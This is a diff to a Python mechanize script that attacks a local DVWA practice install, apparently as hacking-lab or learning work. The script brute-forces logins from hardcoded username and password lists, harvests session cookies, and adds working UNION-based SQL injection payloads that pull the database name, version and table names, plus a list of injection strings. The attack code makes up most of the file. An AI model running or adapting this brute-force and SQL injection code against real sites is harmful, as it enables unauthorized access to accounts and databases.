@@ -1,7 +1,7 @@
 import mechanize
 import re
 import requests
-
+from requests.utils import requote_uri
 admin_list=['user','admin','','mayirp','rihim','tima','ssb']
 pass_list=['user0','abcd@123','pass123','password']
 
@@ -23,12 +23,12 @@ for ad in admin_list:
                         break
 print("\n\n",sub.geturl())
 #Security low code
-br.open("http://localhost/DVWA-master/security.php")
-br.select_form(nr=0)
-br["security"] = ["low"]
-sub = br.submit()
+#br.open("http://localhost/DVWA-master/security.php")
+#br.select_form(nr=0)
+#br["security"] = ["low"]
+#sub = br.submit()
 #print(sub.read())
-print(sub.geturl())
+#print(sub.geturl())
 #Cookies
 cookies = br._ua_handlers['_cookies'].cookiejar
 # convert cookies into a dict usable by requests
@@ -42,6 +42,31 @@ for c in cookies:
 print(cookie_dict)
 
 #print(r)
+# Get database name  http://localhost/DVWA-master/vulnerabilities/sqli/?id=1%27%20union%20select%20database(),version()--+&Submit=Submit#
+br.open("http://localhost/DVWA-master/vulnerabilities/sqli/")
+br.select_form(nr=0)
+br["id"]= "1' union select database(),version()'--+"
+sub=br.submit()
+content = sub.read().decode("utf-8")
+beg = content.rfind('<pre>')
+end = content.rfind('</pre>')
+print("__________________________________________DATABASE Name and Version_____________________")
+print(content[beg:end])
+
+# Get table name  http://localhost/DVWA-master/vulnerabilities/sqli/?id=1%27+union+select+1%2Ctable_name+from+information_schema.tables--+&Submit=Submit#
+##br.open("http://localhost/DVWA-master/vulnerabilities/sqli/")
+##br.select_form(nr=0)
+##br["id"]= "1' union select 1,table_name from information_schema.tables'--+"
+##sub=br.submit()
+##content = sub.read().decode("utf-8")
+##print("__________________________________________Tabel Names_____________________")
+##beg = [m.start() for m in re.finditer('<pre>',content)]
+##end = [m.start() for m in re.finditer('</pre>',content)]
+### print(beg,end)
+##for i in range(len(beg)):
+##        print(content[beg[i]:end[i]])
+##
+
 #sql injection code
 injects=["'","1'","500' OR 1='1"]
 
